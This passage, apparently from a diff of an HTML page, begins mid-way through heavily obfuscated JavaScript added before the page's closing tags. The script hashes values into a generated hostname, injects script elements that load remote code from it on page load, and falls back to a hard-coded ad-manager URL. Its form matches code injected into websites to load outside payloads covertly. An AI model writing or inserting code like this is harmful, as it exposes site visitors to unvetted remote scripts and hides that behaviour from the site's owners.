r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
